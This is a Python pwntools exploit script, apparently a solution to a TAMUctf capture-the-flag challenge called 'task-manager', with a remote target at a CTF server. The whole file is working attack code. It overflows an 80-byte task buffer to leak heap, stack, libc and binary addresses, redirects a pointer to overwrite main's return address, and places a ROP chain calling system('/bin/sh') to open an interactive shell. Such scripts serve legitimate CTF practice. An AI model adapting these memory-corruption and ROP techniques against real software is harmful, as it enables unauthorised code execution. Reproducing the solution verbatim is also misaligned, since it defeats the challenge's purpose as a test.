#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('task-manager_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x555555555356

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote("streams.tamuctf.com", 443, ssl=True, sni="task-manager")
else:
    p = process([exe.path])

def add(task):
    slna(b'Enter your input: ', 1)
    sa(b'nter task (max. 80 characters): ', task)
    p.recvuntil(b'Task you entered: ')


sa(b'(max. 40 characters): ', b'a')

add(b'a'*80)

p.recvuntil(b'a'*80)
heap_leak = u64(p.recv(6) + b'\0\0')
info(f'heap leak: {hex(heap_leak)}')

heap_base = heap_leak - 0x360

load  = flat(
    b'a'
)

# load  =load.ljust(80 ,b'a')
load  =flat(
    b'a'*80,
    heap_base +0x2a0
)

add(load)

add(b'a'*8)

p.recv(8)
stack_leak = u64(p.recv(6) + b'\0\0')
info(f'stack leak: {hex(stack_leak)}')

rip_main = stack_leak + 0xb0

GDB()

load = flat(
    b'a'*80,
    rip_main-8
)

add(load)

add(b'a'*8)
p.recv(8)
libc_leak = u64(p.recv(6) + b'\0\0')
info(f'libc leak: {hex(libc_leak)}')
libc.address = libc_leak - 0x2724a
info(f'libc base; {hex(libc.address)}')

pop_rdi = 0x00000000000277e5 + libc.address
pop_rsi  =0x0000000000028f99 + libc.address
pop_rdx = 0x00000000000fdefd + libc.address


load = flat(
    b'a'*80,
    rip_main+8,
)
add(load)


add(b'a'*8)
p.recvuntil(b'a'*8)
binary_leak = u64(p.recv(6) + b'\0\0')
info(f'binary leak: {hex(binary_leak)}')
exe.address = binary_leak -0x1231
info(f'binary base: {hex(exe.address)}')

load = flat(
    b'a'*80,
    rip_main
)

add(load)

shell = flat(
    pop_rdi +1,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
)
add(shell)

load = flat(
    b'a'*80,
    exe.address + 0x4050
)

add(load)

add(b'\0')

slna(b'Enter your input: ', 5)

p.interactive()
